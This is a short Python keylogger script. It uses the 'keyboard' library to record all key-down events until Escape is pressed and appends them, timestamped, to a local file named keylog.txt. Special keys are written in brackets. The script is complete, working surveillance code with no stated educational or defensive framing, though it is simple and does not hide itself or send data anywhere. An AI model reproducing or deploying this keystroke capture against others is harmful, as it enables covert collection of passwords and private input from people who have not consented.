import keyboard
import datetime


def write_to_file(recorded):
    f = open('keylog.txt', 'a', encoding='utf-8')
    f.write(str(datetime.datetime.now()) + ': ')
    for key in recorded:
        if len(key.name) > 1:
            if key.name == 'space': 
                f.write(' ')
            else:
                f.write('[' + key.name + ']')
        else: 
            f.write(key.name + '')
    f.write('\n')
    f.close()


recorded = keyboard.record(until='esc')
recorded = [event for event in recorded if event.event_type == 'down']
write_to_file(recorded)
